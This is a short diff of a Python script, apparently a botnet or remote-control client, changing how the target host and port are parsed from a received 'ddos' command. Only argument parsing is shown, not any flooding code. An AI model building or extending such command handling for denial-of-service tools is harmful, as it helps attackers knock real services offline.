@@ -41,7 +41,7 @@ if __name__ == "__main__":
 		cmd_type= cmd.split()
 		if(cmd_type[1]=='ddos'):
 			print('DDos functionality')
-			target_host, target_port = cmd_type[-2:]
+			target_host, target_port = cmd_type[2:]
 			target_port = int(target_port)
 			print 'Target Host Address: '+target_host+ \
 				  '\nTarget Port Number: '+str(target_port)
